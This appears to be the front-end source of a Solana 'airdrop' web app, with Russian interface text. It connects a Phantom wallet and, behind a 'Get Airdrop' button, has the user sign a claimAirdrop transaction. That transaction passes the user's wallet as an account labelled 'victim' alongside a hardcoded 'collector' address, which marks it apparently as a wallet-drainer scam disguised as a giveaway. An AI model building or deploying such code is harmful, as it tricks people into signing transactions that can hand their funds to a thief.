import React, { useEffect, useState } from "react";
import { Connection, PublicKey, clusterApiUrl, Transaction } from "@solana/web3.js";
import { AnchorProvider, Program, Idl } from "@project-serum/anchor";

import idl from "./idl.json";

// Обновленный тип для Phantom Wallet
interface PhantomWallet {
  isPhantom?: boolean;
  connect: (options?: { onlyIfTrusted: boolean }) => Promise<{ publicKey: PublicKey }>;
  disconnect: () => Promise<void>;
  on: (event: string, callback: (args: any) => void) => void;
  off: (event: string, callback: (args: any) => void) => void;
  publicKey?: PublicKey;
  signTransaction: (transaction: Transaction) => Promise<Transaction>;
  signAllTransactions: (transactions: Transaction[]) => Promise<Transaction[]>;
}

interface PhantomWindow extends Window {
  solana?: PhantomWallet;
}

declare const window: PhantomWindow;

const network = clusterApiUrl("devnet");
const programID = new PublicKey(idl.metadata.address);

const Actions: React.FC = () => {
  const [isConnected, setIsConnected] = useState(false);
  const [publicKey, setPublicKey] = useState<PublicKey | null>(null);
  const [txSignature, setTxSignature] = useState<string | null>(null);

  useEffect(() => {
    if (window.solana?.isPhantom) {
      if (window.solana.publicKey) {
        setIsConnected(true);
        setPublicKey(window.solana.publicKey);
      }

      const handleConnect = () => {
        setIsConnected(true);
        if (window.solana?.publicKey) {
          setPublicKey(window.solana.publicKey);
        }
      };

      const handleDisconnect = () => {
        setIsConnected(false);
        setPublicKey(null);
      };

      window.solana.on("connect", handleConnect);
      window.solana.on("disconnect", handleDisconnect);

      return () => {
        window.solana?.off("connect", handleConnect);
        window.solana?.off("disconnect", handleDisconnect);
      };
    }
  }, []);

  const connectWallet = async () => {
    try {
      if (!window.solana?.isPhantom) {
        alert("Phantom Wallet не установлен!");
        window.open("https://phantom.app/", "_blank");
        return;
      }

      const response = await window.solana.connect();
      setIsConnected(true);
      setPublicKey(response.publicKey);
    } catch (err) {
      console.error("Ошибка подключения:", err);
      alert("Не удалось подключить кошелек");
    }
  };

  const disconnectWallet = async () => {
    try {
      if (window.solana) {
        await window.solana.disconnect();
        setIsConnected(false);
        setPublicKey(null);
      }
    } catch (err) {
      console.error("Ошибка отключения:", err);
    }
  };

  const callContract = async () => {
    if (!isConnected || !publicKey || !window.solana) {
      alert("Сначала подключите кошелек Phantom");
      return;
    }

    try {
      const connection = new Connection(network);
      const provider = new AnchorProvider(
        connection,
        {
          publicKey: publicKey,
          signAllTransactions: async (transactions: Transaction[]) => {
            return window.solana!.signAllTransactions(transactions);
          },
          signTransaction: async (transaction: Transaction) => {
            return window.solana!.signTransaction(transaction);
          },
        },
        { commitment: "processed" }
      );

      const program = new Program(idl as Idl, programID, provider);

      const tx = await program.methods
        .claimAirdrop()
        .accounts({
          victim: publicKey,
          collector: new PublicKey("wPD8Hc2BPoPk3WoEMbxnn72ELtURj6iKRBWEFtcFSsz"),
          systemProgram: PublicKey.default,
        })
        .rpc();

      setTxSignature(tx);
      alert("Транзакция отправлена! Hash:\n" + tx);
    } catch (err) {
      console.error("Ошибка при вызове контракта:", err);
      alert("Ошибка при отправке транзакции: " + (err instanceof Error ? err.message : String(err)));
    }
  };

  return (
    <div style={{ padding: 20, fontFamily: "sans-serif" }}>
      <h2>🔥 Solana Airdrop dApp</h2>

      {!isConnected ? (
        <button onClick={connectWallet}>🔗 Подключить Phantom</button>
      ) : (
        <>
          <p>
            ✅ Кошелек подключен:<br />
            <code>{publicKey?.toBase58()}</code>
          </p>
          <button onClick={disconnectWallet}>❌ Отключить</button>
          <br />
          <button onClick={callContract} style={{ marginTop: 20 }}>
            📡 Получить Airdrop
          </button>
        </>
      )}

      {txSignature && (
        <p style={{ marginTop: 10 }}>
          Tx Signature: <code>{txSignature}</code>
        </p>
      )}
    </div>
  );
};

function App() {
  return <Actions />;
}

export default App;